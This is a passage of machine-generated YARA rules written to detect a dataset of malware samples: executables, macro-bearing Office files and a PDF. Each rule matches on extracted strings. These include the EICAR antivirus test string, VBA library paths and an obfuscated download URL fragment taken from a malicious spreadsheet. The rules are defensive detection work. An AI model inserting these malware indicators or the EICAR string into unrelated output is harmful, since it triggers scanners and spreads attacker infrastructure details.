      $s12 = "<rdf:Description rdf:about=\"\" xmlns:prism=\"http://prismstandard.org/namespaces/basic/3.0/\"><prism:publicationName>IEEE Trans" ascii /* score: '15.00'*/
      $s13 = " Computing;2022;PP;99;10.1109/TDSC.2022.3203043</rdf:li></rdf:Alt></dc:description><dc:title><rdf:Alt><rdf:li>PointerScope: Unde" ascii /* score: '15.00'*/
      $s14 = "/Type /FontDescriptor" fullword ascii /* score: '14.00'*/
      $s15 = "oZlZfZiZm" fullword ascii /* base64 encoded string 'fV_f&f' */ /* score: '14.00'*/
      $s16 = "lllQQQ:::" fullword ascii /* reversed goodware string ':::QQQlll' */ /* score: '14.00'*/
      $s17 = "icle_version></rdf:Description>" fullword ascii /* score: '13.00'*/
      $s18 = "<rdf:Description rdf:about=\"\" xmlns:prism=\"http://prismstandard.org/namespaces/basic/3.0/\"><prism:publicationName>IEEE Trans" ascii /* score: '12.00'*/
      $s19 = "/w /x /y /z /braceleft 125 /braceright 147 /quotedblleft /quotedblright" fullword ascii /* score: '12.00'*/
      $s20 = "<rdf:Description rdf:about=\"\" xmlns:dc=\"http://purl.org/dc/elements/1.1/\"><dc:format>application/pdf</dc:format><dc:publishe" ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x5025 and filesize < 13000KB and
      8 of them
}

rule f42a8f8f1c3728d01ae98d35c3ff93190c1384542cfc22919b851412febc16ad {
   meta:
      description = "dataset - file f42a8f8f1c3728d01ae98d35c3ff93190c1384542cfc22919b851412febc16ad"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "f42a8f8f1c3728d01ae98d35c3ff93190c1384542cfc22919b851412febc16ad"
   strings:
      $s1 = "EPpLAPy" fullword ascii /* score: '4.00'*/
      $s2 = "APpLEP`" fullword ascii /* score: '4.00'*/
      $s3 = "ETxTEV}" fullword ascii /* score: '4.00'*/
      $s4 = "ETpTATxdAT`L" fullword ascii /* score: '4.00'*/
      $s5 = "APpdEPa" fullword ascii /* score: '4.00'*/
      $s6 = "]KqIfIqB" fullword ascii /* score: '4.00'*/
      $s7 = "APxlETq" fullword ascii /* score: '4.00'*/
      $s8 = "yYHj}YX" fullword ascii /* score: '4.00'*/
      $s9 = "APpCEP`" fullword ascii /* score: '4.00'*/
      $s10 = "EVpDAPy" fullword ascii /* score: '4.00'*/
      $s11 = "APpLEPa" fullword ascii /* score: '4.00'*/
      $s12 = "(Vx\\IVxtAPpx" fullword ascii /* score: '4.00'*/
      $s13 = "APplEP`tEPxl" fullword ascii /* score: '4.00'*/
      $s14 = "ITHtAPq" fullword ascii /* score: '4.00'*/
      $s15 = "yYHU}YX" fullword ascii /* score: '4.00'*/
      $s16 = "yYHe}YXU}YA" fullword ascii /* score: '4.00'*/
      $s17 = "yYHJ}Y@Jp" fullword ascii /* score: '4.00'*/
      $s18 = "ETxcEV}" fullword ascii /* score: '4.00'*/
      $s19 = "ETpDEVw" fullword ascii /* score: '4.00'*/
      $s20 = "yYHM}YY" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 800KB and
      8 of them
}

rule sig_0a899c337465ddc558b83db800299f685a24827b3471ded984b10e64a942da3f {
   meta:
      description = "dataset - file 0a899c337465ddc558b83db800299f685a24827b3471ded984b10e64a942da3f"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "0a899c337465ddc558b83db800299f685a24827b3471ded984b10e64a942da3f"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                    ' */ /* score: '26.50'*/
      $s2 = "*AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAp" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 50KB and
      all of them
}

rule e59cc3a94f6a5119f36c4e0b3fbe6f04cc474d0b0b9d101163dac75722c809da {
   meta:
      description = "dataset - file e59cc3a94f6a5119f36c4e0b3fbe6f04cc474d0b0b9d101163dac75722c809da"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "e59cc3a94f6a5119f36c4e0b3fbe6f04cc474d0b0b9d101163dac75722c809da"
   strings:
      $s1 = "i:Q9s9" fullword ascii /* reversed goodware string '9s9Q:i' */ /* score: '11.00'*/
      $s2 = "QbiNQuiSQ~i" fullword ascii /* score: '7.00'*/
      $s3 = "i:QPiOQviOQbiNQ" fullword ascii /* score: '7.00'*/
      $s4 = "iYQ~iTQbiSQbiNQtiTQei" fullword ascii /* score: '7.00'*/
      $s5 = "B_ -Uzj-" fullword ascii /* score: '5.00'*/
      $s6 = "i:QtiTQ<i}QSi:Q" fullword ascii /* score: '4.00'*/
      $s7 = "iUQdi]Qyi" fullword ascii /* score: '4.00'*/
      $s8 = "QpiJQaiVQxiYQpiNQxiUQ" fullword ascii /* score: '4.00'*/
      $s9 = "i:QyiSQ<isQ_i:Q" fullword ascii /* score: '4.00'*/
      $s10 = "i:QviOQ<iSQ" fullword ascii /* score: '4.00'*/
      $s11 = "i:QeiTQ<i@Qpi:Q" fullword ascii /* score: '4.00'*/
      $s12 = "Q1iCQhiCQhi:QYirQ+iWQ|i" fullword ascii /* score: '4.00'*/
      $s13 = "i:QkiOQ<i`QPi:Q" fullword ascii /* score: '4.00'*/
      $s14 = "i:QtiIQ<i_Qri:Q" fullword ascii /* score: '4.00'*/
      $s15 = "QTiHQciUQci" fullword ascii /* score: '4.00'*/
      $s16 = "i:Qui_Q<iVQdi:Q" fullword ascii /* score: '4.00'*/
      $s17 = "i:Qzi_QciTQtiVQ\"i" fullword ascii /* score: '4.00'*/
      $s18 = "Q1iyQCinQ1iTQ~iNQ1iSQ" fullword ascii /* score: '4.00'*/
      $s19 = "Q~i\\Q1iYQpiVQ}iSQ" fullword ascii /* score: '4.00'*/
      $s20 = "i:QgiSQ<ilQ_i:Q" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 800KB and
      8 of them
}

rule sig_7bc0fdc6b2caf2175c49bfbf735c70e462424aa45cf5d193bd8788eddac08c8c {
   meta:
      description = "dataset - file 7bc0fdc6b2caf2175c49bfbf735c70e462424aa45cf5d193bd8788eddac08c8c"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "7bc0fdc6b2caf2175c49bfbf735c70e462424aa45cf5d193bd8788eddac08c8c"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                   ' */ /* score: '16.50'*/
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAp" fullword ascii /* base64 encoded string '                                                                                   )' */ /* score: '14.00'*/
      $s3 = "sRY6v|%" fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 50KB and
      all of them
}

rule sig_91e0110a5f520ce799c61494a7f321ebed1cd8c8a26a2b2949aa6b43b10f1530 {
   meta:
      description = "dataset - file 91e0110a5f520ce799c61494a7f321ebed1cd8c8a26a2b2949aa6b43b10f1530"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "91e0110a5f520ce799c61494a7f321ebed1cd8c8a26a2b2949aa6b43b10f1530"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */ /* score: '26.50'*/
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                        ' */ /* score: '16.50'*/
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       ' */ /* score: '16.50'*/
      $s4 = ".AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */ /* score: '14.00'*/
      $s5 = "~%oit%/" fullword ascii /* score: '5.00'*/
      $s6 = " -?7fo" fullword ascii /* score: '5.00'*/
      $s7 = "+uEoF\"a" fullword ascii /* score: '4.00'*/
      $s8 = "['bMpuCqL5D" fullword ascii /* score: '4.00'*/
      $s9 = "P?HIdy{wXE" fullword ascii /* score: '4.00'*/
      $s10 = "['dBpoY~L/^" fullword ascii /* score: '4.00'*/
      $s11 = "UbeVi^%Q" fullword ascii /* score: '4.00'*/
      $s12 = "QydHR(X" fullword ascii /* score: '4.00'*/
      $s13 = "m}bzFfBFz&E" fullword ascii /* score: '4.00'*/
      $s14 = "CwNzCgO" fullword ascii /* score: '4.00'*/
      $s15 = "nIM8Vquzn8M'V\\uMn$M2V" fullword ascii /* score: '4.00'*/
      $s16 = "UreaUreaUreaUreaUreaUreaUrea" fullword ascii /* score: '4.00'*/
      $s17 = "8ySCv?" fullword ascii /* score: '4.00'*/
      $s18 = "YSXAr) }Na;" fullword ascii /* score: '4.00'*/
      $s19 = "QsAnmOk)PsW" fullword ascii /* score: '4.00'*/
      $s20 = "K5hA|<PZDWh+|" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 700KB and
      8 of them
}

rule sig_1d85ccc8254dfd89e23bfc5dfae6391d23e572bb02e84139de14e6b8795db07c {
   meta:
      description = "dataset - file 1d85ccc8254dfd89e23bfc5dfae6391d23e572bb02e84139de14e6b8795db07c"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "1d85ccc8254dfd89e23bfc5dfae6391d23e572bb02e84139de14e6b8795db07c"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */ /* score: '26.50'*/
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                        ' */ /* score: '16.50'*/
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       ' */ /* score: '16.50'*/
      $s4 = ".AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */ /* score: '14.00'*/
      $s5 = "3fGE+ r" fullword ascii /* score: '5.00'*/
      $s6 = ".AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* score: '4.00'*/
      $s7 = "duPt\"v" fullword ascii /* score: '4.00'*/
      $s8 = "fXe\"Zs*.fOb" fullword ascii /* score: '4.00'*/
      $s9 = "-dhEeK(b^" fullword ascii /* score: '4.00'*/
      $s10 = "dNhktmjF" fullword ascii /* score: '4.00'*/
      $s11 = "9pPqy{lY" fullword ascii /* score: '4.00'*/
      $s12 = "<dybJCD^v" fullword ascii /* score: '4.00'*/
      $s13 = "SiHl<B`o" fullword ascii /* score: '4.00'*/
      $s14 = "cCof#HSN" fullword ascii /* score: '4.00'*/
      $s15 = ")c[X.Hzj" fullword ascii /* score: '4.00'*/
      $s16 = "|shuWx5Ik8" fullword ascii /* score: '4.00'*/
      $s17 = "Yibfj!yM" fullword ascii /* score: '4.00'*/
      $s18 = "PSUDfni" fullword ascii /* score: '4.00'*/
      $s19 = "7_wovHJSJ" fullword ascii /* score: '4.00'*/
      $s20 = "6RlbZ?" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 700KB and
      8 of them
}

rule be96bc38c87f74d973cf9375370f42e5f9dc854d52e413dac6bc6bacc2a16a63 {
   meta:
      description = "dataset - file be96bc38c87f74d973cf9375370f42e5f9dc854d52e413dac6bc6bacc2a16a63"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "be96bc38c87f74d973cf9375370f42e5f9dc854d52e413dac6bc6bacc2a16a63"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */ /* score: '26.50'*/
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                        ' */ /* score: '16.50'*/
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       ' */ /* score: '16.50'*/
      $s4 = ".AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */ /* score: '14.00'*/
      $s5 = "HfFhHfF8" fullword ascii /* score: '5.00'*/
      $s6 = ".AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* score: '4.00'*/
      $s7 = ";&gmTz^Cd&" fullword ascii /* score: '4.00'*/
      $s8 = "~YHkU'UWi" fullword ascii /* score: '4.00'*/
      $s9 = "1#&qPBL.ew" fullword ascii /* score: '4.00'*/
      $s10 = "1*:NTMu>1#>[HfF" fullword ascii /* score: '4.00'*/
      $s11 = "obHvS^t" fullword ascii /* score: '4.00'*/
      $s12 = "Io[RnDY{Rx" fullword ascii /* score: '4.00'*/
      $s13 = "hKeM PgE" fullword ascii /* score: '4.00'*/
      $s14 = "vknixWR" fullword ascii /* score: '4.00'*/
      $s15 = "fJAXDv}" fullword ascii /* score: '4.00'*/
      $s16 = "&BL+BKiXHKiX" fullword ascii /* score: '4.00'*/
      $s17 = "zIGqQh0Mm" fullword ascii /* score: '4.00'*/
      $s18 = "njKH&Z`s-f\\;" fullword ascii /* score: '4.00'*/
      $s19 = "RylKb?Y" fullword ascii /* score: '4.00'*/
      $s20 = "zjPx4,7F" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 700KB and
      8 of them
}

rule cb6314a15f21d2de2155f9d1563970b7de43373d5fd362de66a56430f56f9f45 {
   meta:
      description = "dataset - file cb6314a15f21d2de2155f9d1563970b7de43373d5fd362de66a56430f56f9f45"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "cb6314a15f21d2de2155f9d1563970b7de43373d5fd362de66a56430f56f9f45"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */ /* score: '26.50'*/
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                             ' */ /* score: '16.50'*/
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                             ' */ /* score: '16.50'*/
      $s4 = "`aaaaA61`" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 40KB and
      all of them
}

rule a0fc8cae1605a9f21b56bf3613627787459bfacaa7134509c2e8aba3c18753c7 {
   meta:
      description = "dataset - file a0fc8cae1605a9f21b56bf3613627787459bfacaa7134509c2e8aba3c18753c7"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "a0fc8cae1605a9f21b56bf3613627787459bfacaa7134509c2e8aba3c18753c7"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */ /* score: '26.50'*/
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                           ' */ /* score: '16.50'*/
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                           ' */ /* score: '16.50'*/
      $s4 = "5,ze7\"" fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 40KB and
      all of them
}

rule sig_018ef51a2af287a3d665e5057e6367eb0a5d5ef5a807af6c255eba26d20b4ccf {
   meta:
      description = "dataset - file 018ef51a2af287a3d665e5057e6367eb0a5d5ef5a807af6c255eba26d20b4ccf"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "018ef51a2af287a3d665e5057e6367eb0a5d5ef5a807af6c255eba26d20b4ccf"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */ /* score: '26.50'*/
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       ' */ /* score: '16.50'*/
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                          ' */ /* score: '16.50'*/
      $s4 = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* score: '0.00'*/
      $s5 = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* score: '0.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 40KB and
      all of them
}

rule sig_1e993ef7ee5f21b9f815ebf853b0bd40d3328a1bd6d680ffc3ace55e4bf73a89 {
   meta:
      description = "dataset - file 1e993ef7ee5f21b9f815ebf853b0bd40d3328a1bd6d680ffc3ace55e4bf73a89"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "1e993ef7ee5f21b9f815ebf853b0bd40d3328a1bd6d680ffc3ace55e4bf73a89"
   strings:
      $x1 = "C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\OFFICE16\\MSO.DLL" fullword ascii /* score: '32.00'*/
      $s2 = "C:\\PROGRA~2\\COMMON~1\\MICROS~1\\VBA\\VBA7.1\\VBE7.DLL" fullword ascii /* score: '29.00'*/
      $s3 = "*\\G{2DF8D04C-5BFA-101B-BDE5-00AA0044DE52}#2.8#0#C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\OFFICE16\\MSO.DLL#Micr" wide /* score: '28.00'*/
      $s4 = "ies.com/wp-content/themes/adamje@" fullword ascii /* score: '22.00'*/
      $s5 = "#4.2#9#C:\\PROGRA~2\\COMMON~1\\MICROS~1\\VBA\\VBA7.1\\VBE7.DLL#Visual Basic For Applications" fullword wide /* score: '21.00'*/
      $s6 = " (664 - @649#))" fullword ascii /* score: '17.00'*/ /* hex encoded string 'fFI' */
      $s7 = "https://ahd|d5%lYm|d5%lYspor|d5%lYt.com/boots|P." fullword ascii /* score: '17.00'*/
      $s8 = "#1.9#0#C:\\Program Files (x86)\\Microsoft Office\\Office16\\EXCEL.EXE#Microsoft Excel 16.0 Object Library" fullword wide /* score: '17.00'*/
      $s9 = "VVVAAAAAAA" fullword wide /* base64 encoded string 'UU@    ' */ /* score: '16.50'*/
      $s10 = "EL.EXE" fullword ascii /* score: '16.00'*/
      $s11 = "contemptibleneskh" fullword ascii /* score: '15.00'*/
      $s12 = "logo_ias_agent_pages" fullword wide /* score: '14.00'*/
      $s13 = "VVVVVL" fullword wide /* reversed goodware string 'LVVVVV' */ /* score: '13.50'*/
      $s14 = "C:\\Windows\\SysWOW64\\stdole2.tlb" fullword ascii /* score: '13.00'*/
      $s15 = "ballogie" fullword ascii /* score: '13.00'*/
      $s16 = "postdocb" fullword ascii /* score: '13.00'*/
      $s17 = "imposthumationha" fullword ascii /* score: '13.00'*/
      $s18 = "mythologerstimp" fullword ascii /* score: '13.00'*/
      $s19 = "imposthu" fullword ascii /* score: '13.00'*/
      $s20 = "ednugget" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0xcfd0 and filesize < 700KB and
      1 of ($x*) and 4 of them
}

rule sig_12735482351d0b7b5018f46f78b124c2c0c39a8a3479c44e73f646ce1bb49f95 {
   meta:
      description = "dataset - file 12735482351d0b7b5018f46f78b124c2c0c39a8a3479c44e73f646ce1bb49f95"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "12735482351d0b7b5018f46f78b124c2c0c39a8a3479c44e73f646ce1bb49f95"
   strings:
      $s1 = "word/theme/theme1.xmlPK" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s2 = "word/document.xmlPK" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s3 = "word/styles.xmlPK" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s4 = "word/fontTable.xmlPK" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s5 = "word/_rels/document.xml.relsPK" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s6 = "word/webSettings.xmlPK" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s7 = "word/theme/theme1.xml" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s8 = "word/settings.xmlPK" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s9 = "word/webSettings.xml" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s10 = "word/_rels/document.xml.rels " fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s11 = "Vso3<E" fullword ascii /* score: '1.00'*/
      $s12 = "6(2\",<" fullword ascii /* score: '1.00'*/
      $s13 = "jv`fW~^" fullword ascii /* score: '1.00'*/
      $s14 = "z(Ro=Tm" fullword ascii /* score: '1.00'*/
      $s15 = "SB#P}[" fullword ascii /* score: '1.00'*/
      $s16 = "4-mhD,5" fullword ascii /* score: '1.00'*/
      $s17 = "h9iQx+ve" fullword ascii /* score: '1.00'*/
      $s18 = "55$`M=r@vb" fullword ascii /* score: '1.00'*/
      $s19 = "SH[%Heq" fullword ascii /* score: '1.00'*/
      $s20 = "~U.#HR`y{-> |" fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 40KB and
      8 of them
}

rule fd71a2fcc0b5dd0fb0dbff257839b67749f2cadf30e2d3dae7f0e941d93d24d3 {
   meta:
      description = "dataset - file fd71a2fcc0b5dd0fb0dbff257839b67749f2cadf30e2d3dae7f0e941d93d24d3"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "fd71a2fcc0b5dd0fb0dbff257839b67749f2cadf30e2d3dae7f0e941d93d24d3"
   strings:
      $s1 = "xl/sharedStrings.bin" fullword ascii /* score: '13.00'*/
      $s2 = "xl/styles.bin" fullword ascii /* score: '10.00'*/
      $s3 = "xl/workbook.bin" fullword ascii /* score: '10.00'*/
      $s4 = "xl/macrosheets/sheet1.bin" fullword ascii /* score: '10.00'*/
      $s5 = "xl/printerSettings/printerSettings1.bin" fullword ascii /* score: '10.00'*/
      $s6 = "xl/worksheets/binaryIndex1.bin" fullword ascii /* score: '10.00'*/
      $s7 = "xl/worksheets/_rels/sheet2.bin.relsPK" fullword ascii /* score: '10.00'*/
      $s8 = "xl/_rels/workbook.bin.relsPK" fullword ascii /* score: '10.00'*/
      $s9 = "xl/sharedStrings.binPK" fullword ascii /* score: '10.00'*/
      $s10 = "xl/_rels/workbook.bin.rels " fullword ascii /* score: '10.00'*/
      $s11 = "xl/worksheets/binaryIndex2.bin" fullword ascii /* score: '10.00'*/
      $s12 = "xl/worksheets/_rels/sheet1.bin.relsPK" fullword ascii /* score: '10.00'*/
      $s13 = "xl/vbaProject.bin" fullword ascii /* score: '10.00'*/
      $s14 = "xl/worksheets/_rels/sheet1.bin.rels" fullword ascii /* score: '10.00'*/
      $s15 = "xl/worksheets/_rels/sheet2.bin.relsl" fullword ascii /* score: '10.00'*/
      $s16 = "xl/worksheets/sheet2.bin" fullword ascii /* score: '10.00'*/
      $s17 = "xl/macrosheets/_rels/sheet1.bin.rels" fullword ascii /* score: '10.00'*/
      $s18 = "xl/macrosheets/binaryIndex1.bin" fullword ascii /* score: '10.00'*/
      $s19 = "xl/macrosheets/_rels/sheet1.bin.relsPK" fullword ascii /* score: '10.00'*/
      $s20 = "eqopjtb" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 400KB and
      8 of them
}

rule sig_88d2907abded3c9bc2f7198c882e58d031e997af9910b6b5cc295bdc2c614502 {
   meta:
      description = "dataset - file 88d2907abded3c9bc2f7198c882e58d031e997af9910b6b5cc295bdc2c614502"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "88d2907abded3c9bc2f7198c882e58d031e997af9910b6b5cc295bdc2c614502"
   strings:
      $s1 = "word/_rels/header1.xml.rels" fullword ascii /* score: '12.00'*/
      $s2 = "word/_rels/header1.xml.relsPK" fullword ascii /* score: '12.00'*/
      $s3 = "word/header1.xml" fullword ascii /* score: '12.00'*/
      $s4 = " & & &" fullword ascii /* reversed goodware string '& & & ' */ /* score: '11.00'*/
      $s5 = "kTT1teGAh" fullword ascii /* base64 encoded string 'M=mx`!' */ /* score: '11.00'*/
      $s6 = "word/_rels/vbaProject.bin.relsm" fullword ascii /* score: '10.00'*/
      $s7 = "word/vbaProject.bin" fullword ascii /* score: '10.00'*/
      $s8 = "word/_rels/vbaProject.bin.relsPK" fullword ascii /* score: '10.00'*/
